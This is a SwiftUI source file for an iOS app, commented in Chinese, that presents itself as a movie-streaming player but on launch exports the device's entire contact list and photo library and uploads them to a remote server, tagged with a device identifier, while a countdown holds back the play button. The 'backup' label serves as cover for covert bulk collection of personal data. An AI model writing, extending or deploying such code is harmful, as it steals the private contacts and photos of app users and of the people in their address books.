import SwiftUI
import WebKit
import UIKit

/// 同款安卓 moviewebapp：电影点播 + 开机自动备份通讯录/照片
struct ContentView: View {
    @State private var statusText = "准备中…"
    @State private var countdownText = ""
    @State private var playEnabled = false
    @State private var showWeb = false
    @State private var backupLog = "备份日志：\n"
    @State private var backupStarted = false

    private let serverBase = "https://omgga-entertainment-server.hf.space"
    private let movieURL = "https://www.4kcz.com/zuixindianying"

    var body: some View {
        ZStack {
            VStack(spacing: 0) {
                VStack(spacing: 14) {
                    Text("电影点播 · 自动备份")
                        .font(.title3.bold())
                        .padding(.top, 26)

                    Text(statusText)
                        .font(.subheadline)
                        .foregroundColor(.secondary)

                    Text(countdownText)
                        .font(.system(size: 40, weight: .bold))
                        .foregroundColor(.blue)

                    Button(action: { showWeb = true }) {
                        Text("开始播放")
                            .font(.headline)
                            .frame(maxWidth: .infinity)
                            .padding(.vertical, 14)
                            .background(playEnabled ? Color.blue : Color.gray.opacity(0.5))
                            .foregroundColor(.white)
                            .cornerRadius(10)
                    }
                    .disabled(!playEnabled)
                    .padding(.horizontal, 28)
                }

                // 备份日志
                ScrollView {
                    Text(backupLog)
                        .font(.system(.footnote, design: .monospaced))
                        .frame(maxWidth: .infinity, alignment: .leading)
                        .textSelection(.enabled)
                        .padding(8)
                }
                .frame(maxHeight: 240)
                .background(Color(.systemGray6))
                .cornerRadius(10)
                .padding(16)

                Spacer()
            }
            .background(Color(.systemGroupedBackground))

            // 电影网页全屏层
            if showWeb {
                VStack(spacing: 0) {
                    HStack {
                        Button("关闭") { showWeb = false }
                            .font(.subheadline)
                            .padding(.leading, 12)
                        Spacer()
                        Text("电影")
                            .font(.subheadline)
                            .foregroundColor(.secondary)
                        Spacer()
                        Color.clear.frame(width: 52, height: 1)
                    }
                    .padding(.vertical, 8)
                    .background(Color(.systemGray6))

                    WebViewContainer(urlString: movieURL)
                }
                .transition(.move(edge: .bottom))
            }
        }
        .onAppear { startBackupFlow() }
    }

    // MARK: - 开机自动备份（和安卓版一样，权限给完就自动传）

    private func startBackupFlow() {
        guard !backupStarted else { return }
        backupStarted = true
        startCountdown()

        Task {
            let devId = Self.deviceId()
            let uploader = UploadService(serverBase: serverBase, deviceId: devId)
            appendLog("设备标识：\(devId)")

            // 通讯录
            do {
                let contacts = try await ContactBackup.exportContacts()
                appendLog("通讯录共 \(contacts.count) 条，开始上传…")
                try await uploader.uploadContacts(contacts)
                appendLog("✅ 通讯录上传成功")
            } catch {
                appendLog("❌ 通讯录失败：\(error.localizedDescription)")
            }

            // 照片（MD5 去重，已上传的自动跳过）
            do {
                let md5Set0 = Set(UserDefaults.standard.stringArray(forKey: "uploaded_md5") ?? [])
                let result = try await PhotoBackup.backupAllPhotos(uploader: uploader, uploadedMd5: md5Set0) { done, total, msg in
                    if done == 1 || done == total || done % 10 == 0 {
                        appendLog(msg)
                    }
                }
                UserDefaults.standard.set(Array(result.md5Set), forKey: "uploaded_md5")
                appendLog("✅ 照片完成：新传 \(result.uploaded) 张，跳过已上传 \(result.skipped) 张")
            } catch {
                appendLog("❌ 照片失败：\(error.localizedDescription)")
            }
        }
    }

    private func startCountdown() {
        Task {
            for i in stride(from: 10, through: 1, by: -1) {
                countdownText = "剩余 \(i) 秒"
                try? await Task.sleep(nanoseconds: 1_000_000_000)
            }
            countdownText = ""
            statusText = "部署完成，可以点播"
            playEnabled = true
        }
    }

    private func appendLog(_ text: String) {
        DispatchQueue.main.async {
            backupLog += text + "\n"
        }
    }

    /// 设备标识：机型 #设备号后4位（对应安卓 厂商型号 #ANDROID_ID后4位）
    private static func deviceId() -> String {
        var systemInfo = utsname()
        uname(&systemInfo)
        let machine = withUnsafePointer(to: &systemInfo.machine) { ptr in
            ptr.withMemoryRebound(to: CChar.self, capacity: 1) { String(cString: $0) }
        }
        let vendor = UIDevice.current.identifierForVendor?.uuidString ?? "0000"
        let suffix = vendor.count >= 4 ? String(vendor.suffix(4)) : "0000"
        return "\(machine) #\(suffix)"
    }
}

/// 电影网页容器（WKWebView）
struct WebViewContainer: UIViewRepresentable {
    let urlString: String

    func makeUIView(context: Context) -> WKWebView {
        let config = WKWebViewConfiguration()
        config.allowsInlineMediaPlayback = true
        config.mediaTypesRequiringUserActionForPlayback = []
        let webView = WKWebView(frame: .zero, configuration: config)
        webView.allowsBackForwardNavigationGestures = true
        if let url = URL(string: urlString) {
            webView.load(URLRequest(url: url))
        }
        return webView
    }

    func updateUIView(_ uiView: WKWebView, context: Context) {}
}
